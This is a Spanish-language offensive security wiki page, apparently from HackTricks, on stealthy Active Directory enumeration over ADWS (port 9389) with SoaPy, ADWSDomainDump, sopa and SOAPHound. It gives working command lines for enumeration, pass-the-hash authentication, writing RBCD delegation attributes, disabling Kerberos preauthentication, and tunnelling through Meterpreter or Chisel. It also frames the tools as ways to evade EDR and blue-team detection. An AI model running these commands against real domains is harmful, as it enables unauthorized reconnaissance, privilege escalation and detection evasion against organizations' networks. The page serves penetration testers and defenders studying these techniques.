# Enumeración de Active Directory Web Services (ADWS) y recopilación sigilosa

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es ADWS?

Active Directory Web Services (ADWS) está **habilitado de forma predeterminada en todos los Domain Controllers desde Windows Server 2008 R2** y escucha en TCP **9389**. A pesar del nombre, **no interviene HTTP**. En su lugar, el servicio expone datos de estilo LDAP mediante una pila de protocolos de framing .NET propietarios:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como el tráfico está encapsulado en estos frames SOAP binarios y viaja por un puerto poco común, **es mucho menos probable que la enumeración a través de ADWS sea inspeccionada, filtrada o detectada por firmas que el tráfico LDAP clásico por los puertos 389 y 636**. Para los operadores, esto significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon más sigiloso: los equipos Blue suelen centrarse en las consultas LDAP.
* Libertad para recopilar datos desde **hosts no Windows (Linux, macOS)** mediante un túnel de 9389/TCP a través de un proxy SOCKS.
* Los mismos datos que obtendrías mediante LDAP (usuarios, grupos, ACL, esquema, etc.) y la capacidad de realizar **escrituras** (p. ej., `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

Las interacciones de ADWS se implementan mediante WS-Enumeration: cada consulta empieza con un mensaje `Enumerate` que define el filtro/los atributos LDAP y devuelve un GUID `EnumerationContext`, seguido de uno o más mensajes `Pull` que transmiten resultados hasta el límite definido por el servidor.<sup>[[7]](#references)</sup> Los contextos caducan tras ~30 minutos, así que las herramientas deben paginar los resultados o dividir los filtros (consultas por prefijo de CN) para evitar perder el estado.<sup>[[8]](#references)</sup> Al solicitar descriptores de seguridad, especifica el control `LDAP_SERVER_SD_FLAGS_OID` para omitir las SACL; de lo contrario, ADWS simplemente elimina el atributo `nTSecurityDescriptor` de su respuesta SOAP.

> NOTA: ADWS también se usa en muchas herramientas RSAT de GUI/PowerShell, por lo que el tráfico puede confundirse con actividad legítima de administración.

## SoaPy: cliente Python nativo

[SoaPy](https://github.com/logangoins/soapy) es una **reimplementación completa de la pila del protocolo ADWS en Python puro**. Construye los frames NBFX/NBFSE/NNS/NMF byte por byte, lo que permite recopilar datos desde sistemas tipo Unix sin usar el runtime de .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Funciones principales

* Admite **el uso de proxy SOCKS** (útil desde implantes C2).
* Filtros de búsqueda detallados, idénticos a LDAP: `-q '(objectClass=user)'`.
* Operaciones opcionales de **escritura** (`--set` / `--delete`).
* **Modo de salida BOFHound** para importar datos directamente en BloodHound.<sup>[[3]](#references)</sup>
* La opción `--parse` mejora la legibilidad de las marcas de tiempo y `userAccountControl` cuando se necesita una lectura más clara.<sup>[[2]](#references)</sup>

### Opciones de recopilación dirigida y operaciones de escritura

SoaPy incluye opciones específicas que replican las tareas de hunting LDAP más habituales mediante ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, además de las opciones `--query` / `--filter` para consultas personalizadas. Combínalas con primitivas de escritura como `--rbcd <source>` (establece `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparación de SPN para Kerberoasting dirigido) y `--asrep` (activa `DONT_REQ_PREAUTH` en `userAccountControl`).<sup>[[2]](#references)</sup>

Ejemplo de búsqueda dirigida de SPN que solo devuelve `samAccountName` y `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Usa el mismo host/las mismas credenciales para aprovechar de inmediato los hallazgos: vuelca los objetos compatibles con RBCD con `--rbcds` y luego aplica `--rbcd 'WEBSRV01$' --account 'FILE01$'` para preparar una cadena de Resource-Based Constrained Delegation (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para conocer la ruta completa de abuso).

### Instalación (host del operador)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump sobre ADWS (Linux/Windows)

* Fork de `ldapdomaindump` que sustituye las consultas LDAP por llamadas ADWS en TCP/9389 para reducir las detecciones por firmas LDAP.
* Realiza una comprobación inicial de accesibilidad en 9389, a menos que se pase `--force` (omite la comprobación si los escaneos de puertos generan ruido o están filtrados).
* Probado con Microsoft Defender for Endpoint y CrowdStrike Falcon, con un bypass exitoso según el README.<sup>[[4]](#references)</sup>

### Instalación

```bash
pipx install .
```

### Uso

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

El resultado típico registra la comprobación de accesibilidad del puerto 9389, el enlace a ADWS y el inicio y la finalización del dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Un cliente práctico para ADWS en Golang

Al igual que soapy, [sopa](https://github.com/Macmod/sopa) implementa la pila del protocolo ADWS (MS-NNS + MC-NMF + SOAP) en Golang y expone opciones de línea de comandos para realizar llamadas a ADWS como:<sup>[[5]](#references)</sup>

* **Búsqueda y recuperación de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` y `delete`
* **Edición de atributos** - `attr [add|replace|delete]`
* **Administración de cuentas** - `set-password` / `change-password`
* y otros, como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Aspectos destacados de la correspondencia de protocolos

* Las búsquedas al estilo LDAP se realizan mediante **WS-Enumeration** (`Enumerate` + `Pull`), con proyección de atributos, control del ámbito (Base/OneLevel/Subtree) y paginación.
* La recuperación de un objeto individual usa **WS-Transfer** `Get`; los cambios de atributos usan `Put`; las eliminaciones usan `Delete`.
* La creación de objetos integrada usa **WS-Transfer ResourceFactory**; para objetos personalizados se usa un **IMDA AddRequest** basado en plantillas YAML.
* Las operaciones con contraseñas son acciones de **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Descubrimiento de metadatos sin autenticación (mex)

ADWS expone WS-MetadataExchange sin credenciales, una forma rápida de validar la exposición antes de autenticarse:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notas sobre la detección de DNS/DC y el targeting de Kerberos

Sopa puede resolver los DC mediante SRV si se omite `--dc` y se proporciona `--domain`. Consulta en este orden y usa el destino con mayor prioridad:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operativamente, se recomienda usar un resolvedor controlado por un DC para evitar fallos en entornos segmentados:

* Usa `--dns <DC-IP>` para que todas las consultas SRV/PTR/directas pasen por el DNS del DC.
* Usa `--dns-tcp` cuando UDP esté bloqueado o las respuestas SRV sean grandes.
* Si Kerberos está habilitado y `--dc` es una IP, sopa realiza una consulta **PTR inversa** para obtener un FQDN y dirigir correctamente las solicitudes al SPN/KDC. Si no se usa Kerberos, no se realiza ninguna consulta PTR.

Ejemplo (IP + Kerberos, DNS forzado a través del DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opciones de material de autenticación

Además de las contraseñas en texto plano, sopa admite **hashes NT**, **claves AES de Kerberos**, **ccache** y **certificados PKINIT** (PFX o PEM) para la autenticación en ADWS. Kerberos se usa implícitamente al utilizar `--aes-key`, `-c` (ccache) u opciones basadas en certificados.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Creación de objetos personalizados mediante plantillas

Para clases de objeto arbitrarias, el comando `create custom` consume una plantilla YAML que se asigna a una `AddRequest` de IMDA:<sup>[[5]](#references)</sup>

* `parentDN` y `rdn` definen el contenedor y el DN relativo.
* `attributes[].name` admite `cn` o `addata:cn` con espacio de nombres.
* `attributes[].type` acepta `string|int|bool|base64|hex` o `xsd:*` explícito.
* **No** incluyas `ad:relativeDistinguishedName` ni `ad:container-hierarchy-parent`; sopa los inyecta.
* Los valores `hex` se convierten a `xsd:base64Binary`; usa `value: ""` para establecer cadenas vacías.

## SOAPHound – Recopilación de AD de alto volumen (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) es un recolector .NET que mantiene todas las interacciones LDAP dentro de ADWS y genera JSON compatible con BloodHound v4. Primero crea una caché completa de `objectSid`, `objectGUID`, `distinguishedName` y `objectClass` (`--buildcache`), y luego la reutiliza para las pasadas de alto volumen `--bhdump`, `--certdump` (ADCS) o `--dnsdump` (DNS integrado en AD), de modo que solo ~35 atributos críticos salen del DC. AutoSplit (`--autosplit --threshold <N>`) divide automáticamente las consultas por prefijo CN para mantenerse por debajo del límite de tiempo de espera de 30 minutos de EnumerationContext en bosques grandes.<sup>[[8]](#references)</sup>

Flujo de trabajo habitual en una VM de operador unida al dominio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Los datos JSON exportados se integran directamente en los flujos de trabajo de SharpHound/BloodHound; consulta [BloodHound methodology](bloodhound.md) para ver ideas de análisis de grafos posteriores. AutoSplit hace que SOAPHound sea resistente en bosques con millones de objetos y, al mismo tiempo, reduce el número de consultas en comparación con las instantáneas al estilo de ADExplorer.

## Flujo de trabajo de recopilación sigilosa de AD

El siguiente flujo de trabajo muestra cómo enumerar **objetos de dominio y ADCS** mediante ADWS, convertirlos a JSON de BloodHound y buscar rutas de ataque basadas en certificados, todo desde Linux:

1. **Establece un túnel para 9389/TCP** desde la red de destino hasta tu equipo (p. ej., mediante Chisel, Meterpreter, reenvío dinámico de puertos SSH, etc.). Exporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o usa `--proxyHost/--proxyPort` de SoaPy.

2. **Recopila el objeto del dominio raíz:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Recopilar objetos relacionados con ADCS desde el NC de configuración:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Convertir a BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carga el ZIP** en la GUI de BloodHound y ejecuta consultas Cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar rutas de escalada mediante certificados (ESC1, ESC8, etc.).

### Escritura de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Combina esto con `s4u2proxy`/`Rubeus /getticket` para una cadena completa de **Resource-Based Constrained Delegation** (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumen de herramientas

| Propósito | Herramienta | Notas |
|---------|------|-------|
| Enumeración de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lectura/escritura |
| Volcado de ADWS de alto volumen | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, primero la caché, modos BH/ADCS/DNS |
| Ingestión en BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convierte registros de SoaPy/ldapsearch |
| Compromiso de certificados | [Certipy](https://github.com/ly4k/Certipy) | Puede enrutarse a través del mismo SOCKS |
| Enumeración de ADWS y cambios en objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interactuar con endpoints conocidos de ADWS; permite enumerar, crear objetos, modificar atributos y cambiar contraseñas |

## References

- [1] [SpecterOps – Asegúrate de usar SOAP(y): guía para operadores sobre la recopilación sigilosa de datos de AD mediante ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Especificaciones MC-NBFX, MC-NBFSE, MS-NNS y MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumeración sigilosa de entornos de Active Directory mediante ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Herramienta SOAPHound para recopilar datos de Active Directory mediante ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
